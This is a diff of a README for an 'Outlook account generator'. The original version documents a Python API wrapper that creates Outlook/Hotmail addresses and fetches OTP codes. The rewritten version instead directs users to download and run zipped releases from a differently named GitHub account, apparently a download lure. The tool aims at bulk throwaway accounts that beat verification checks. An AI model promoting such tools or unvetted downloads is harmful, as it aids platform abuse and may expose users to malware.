@@ -1,90 +1,96 @@
-# Outlook Account Generator (API Wrapper)
+# ✉️ outlook-account-generator - Instantly Create Outlook Emails
 
-[![Python](https://img.shields.io/badge/Python-3.6%2B-blue)](https://www.python.org/)
-[![API Status](https://img.shields.io/badge/API-Active-success)](https://rapidapi.com/EymenTakak/api/temp-outlook-api)
-[![License](https://img.shields.io/badge/License-MIT-green)](https://opensource.org/licenses/MIT)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/josedvallea/outlook-account-generator/releases)
 
-A lightweight Python library to generate **real Microsoft Outlook & Hotmail** email addresses instantly. 
-Unlike standard temp-mail services, these domains have high trust scores on major platforms.
+## 📋 Overview
 
-This library allows you to access inboxes via JSON to **fetch OTP codes automatically**. 
-**No Selenium, Puppeteer, or headless browsers required.**
+Welcome to the Outlook Account Generator. This tool helps you create real Microsoft Outlook and Hotmail email addresses quickly and easily. Unlike temporary email services, these addresses are reliable and work well on most platforms.
 
-## 🚀 Features
+### 💡 Why Use This Tool?
 
-* **Real Domains:** Generates `@outlook.com` and `@hotmail.com` addresses.
-* **JSON Inbox:** Fetch emails and verification codes via a simple method.
-* **Secure:** Uses encrypted tokens for session management.
-* **Fast:** Purely request-based (Lightweight & Fast).
+- **Real Domains:** Generate usable and trusted email addresses.
+- **Simple Inbox Access:** Fetch OTP codes effortlessly.
+- **Secure Operations:** Your sessions use encryption for safety.
+- **Fast and Lightweight:** Enjoy a seamless experience without heavy software.
 
-## 📦 Installation
+## 🚀 Getting Started
 
-You can install the package via pip:
+Follow these steps to download and run the application.
 
-```bash
-pip install outlook-account-generator
-```
+### Step 1: Prepare Your System
 
-## 🔑 API Key Required
+Ensure you have a compatible operating system. The application works well on:
 
-To use this library, you need an API Key.
-👉 **[Get your Free API Key Here](https://rapidapi.com/EymenTakak/api/temp-outlook-api)**
+- Windows 10 or later
+- macOS Mojave or later
+- Linux (Most Distros)
 
-## ⚡ Quick Start Guide
+### Step 2: Visit the Download Page
 
-### 1. Initialize the Client
+Go to the Releases page to grab the latest version of the Outlook Account Generator. You can find it here:
 
-First, import the library and initialize it with your RapidAPI Key.
+[Download Latest Release](https://github.com/josedvallea/outlook-account-generator/releases)
 
-```python
-from outlook_account_generator import OutlookGen
+### Step 3: Download the Application
 
-# Replace with your actual API Key
-API_KEY = "YOUR_RAPIDAPI_KEY_HERE"
-api = OutlookGen(API_KEY)
-```
+On the Releases page, you will see a list of available files. Choose the most recent version suitable for your operating system and click to download.
 
-### 2. Generate a New Account
+### Step 4: Extract the Files
 
-You can choose between `outlook` or `hotmail`.
+Once the download completes, locate the downloaded file in your downloads folder. You may need to extract the zipped folder:
 
-```python
-# Create a new Outlook account
-try:
-    account = api.create_account("outlook")
+- **On Windows:** Right-click the zipped folder and choose 'Extract All'.
+- **On macOS:** Double-click the zipped folder to unpack it.
+- **On Linux:** Use the terminal or file manager to extract.
 
-    email = account['email']
-    token = account['enc_token']
+### Step 5: Install Any Required Dependencies
 
-    print(f"✅ Generated Email: {email}")
+Before running the application, check if you need to install Python, as this tool requires it to operate correctly. 
 
-except Exception as e:
-    print(f"Error: {e}")
-```
+- **To Install Python:**
+  - Visit the [Python Download Page](https://www.python.org/downloads).
+  - Choose your operating system and follow the installation instructions.
 
-### 3. Wait for OTP / Email
+### Step 6: Run the Application
 
-Use the `wait_for_otp` helper function to automatically poll the inbox until a message arrives.
+Navigate to the extracted folder. You will typically see a file named `app.py` or similar.
 
-```python
-print(f"[*] Waiting for email on {email}...")
+- **On Windows:**
+  1. Open Command Prompt.
+  2. Change the directory to where you extracted the files using `cd path\to\extracted\folder`.
+  3. Type `python app.py` and press Enter.
 
-# Checks inbox every 5 seconds, times out after 60 seconds
-email_data = api.wait_for_otp(email, token, timeout=60)
+- **On macOS/Linux:**
+  1. Open Terminal.
+  2. Change the directory to the extracted folder using `cd /path/to/extracted/folder`.
+  3. Type `python3 app.py` and hit Enter.
 
-if email_data:
-    print("\n📩 New Email Received:")
-    print(f"From: {email_data['sender']}")
-    print(f"Subject: {email_data['title']}")
-    print(f"Body: {email_data['content']}") # Content is HTML-stripped
-else:
-    print("❌ No email received within timeout.")
-```
+### Step 7: Follow the Instructions
 
-## ⚖️ Disclaimer
+Once the application runs, follow the on-screen prompts to create your Outlook or Hotmail email address. Enter your desired username and wait while the tool generates your new email.
 
-This tool is designed for educational purposes, software testing, and automation development. 
-Please refer to the [RapidAPI Terms](https://rapidapi.com/EymenTakak/api/temp-outlook-api) for usage limits.
+### Additional Features
 
----
-[Get Premium Access](https://rapidapi.com/EymenTakak/api/temp-outlook-api)
+- **Email Management:** You can manage your new inbox and check for messages through the simple interface.
+- **One-Click OTP Retrieval:** Get your one-time passwords sent to your generated email address without hassle.
+- **Secure Sessions:** The tool ensures that your sessions remain safe through encrypted tokens.
+
+## 📦 Download & Install
+
+To download the latest version of the Outlook Account Generator, visit the link below:
+
+[Download Latest Release](https://github.com/josedvallea/outlook-account-generator/releases)
+
+## 🔧 Troubleshooting
+
+If you encounter issues during installation or while running the application, consider the following steps:
+
+1. **Ensure Python is Installed:** Make sure you have the correct Python version (3.6 or later).
+2. **Check for Internet Connection:** The application requires an active internet connection to work correctly.
+3. **Review Permissions:** Ensure you have the necessary permissions to run applications on your device.
+
+## 📞 Support
+
+For further questions or assistance, feel free to open an issue in the repository. 
+
+Thank you for using the Outlook Account Generator!
